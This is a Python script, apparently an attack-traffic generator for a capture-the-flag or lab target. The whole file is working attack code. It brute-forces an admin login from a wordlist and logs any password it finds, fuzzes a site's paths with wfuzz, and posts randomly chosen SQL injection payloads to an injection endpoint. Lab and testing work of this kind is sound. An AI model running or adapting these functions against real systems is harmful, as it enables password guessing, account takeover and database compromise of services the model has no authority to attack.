import requests
import logging
import wfuzz
import time
import random
import os
import glob
from consts import API_URL, STATIC_PATH, TARGET_URL


headers = {
        "Content-Type": "application/json"
    }


def bruteforce_login(logger: logging.Logger, timeout: int, username: str = "admin") -> None:
    with open(f"{STATIC_PATH}/wordlist.txt", "r") as f:
        passwds = f.read().split('\n')

    data = {
        "username": username,
        "password": "<>"
    }
    current_time = time.time()
    number_of_passwds = len(passwds)
    while True:
        for n, passwd in enumerate(passwds):
            logger.debug(f'Trying password {n + 1}/{number_of_passwds}')
            data['password'] = passwd

            r = requests.post(f'{API_URL}/login', headers=headers, json=data)

            if r.status_code == 200:
                logger.info(f'\nFound password for Admin: {passwd}')
                break

            time.sleep(1)

            if time.time() > current_time + timeout:
                break

        if time.time() > current_time + timeout:
            break


def fuzz_website(logger: logging.Logger, timeout: int) -> None:
    current_time = time.time()
    while True:
        for r in wfuzz.fuzz(url=f"{TARGET_URL}FUZZ", hc=[404], payloads=[("file", {"fn": f"{STATIC_PATH}/fuzz.txt"})]):
            logger.info(r)
            if time.time() > current_time + timeout:
                break

        if time.time() > current_time + timeout:
            break

    logger.info("Finished Fuzzing")


def sqli(logger: logging.Logger, timeout: int) -> None:
    directory = f"{STATIC_PATH}/sqli"
    file_extension = "*"

    file_list = random.choices(glob.glob(os.path.join(directory, file_extension)), k=10)

    payloads = []

    for file_path in file_list:
        try:
            with open(file_path, "r") as f:
                payloads += f.read().split('\n')[:-1]
        except Exception:
            pass

    current_time = time.time()
    while True:
        time.sleep(1)
        payload = random.choice(payloads)
        requests.post(url=f"{API_URL}/ctf/injection", headers=headers, json={"search": payload})

        if time.time() > current_time + timeout:
            break
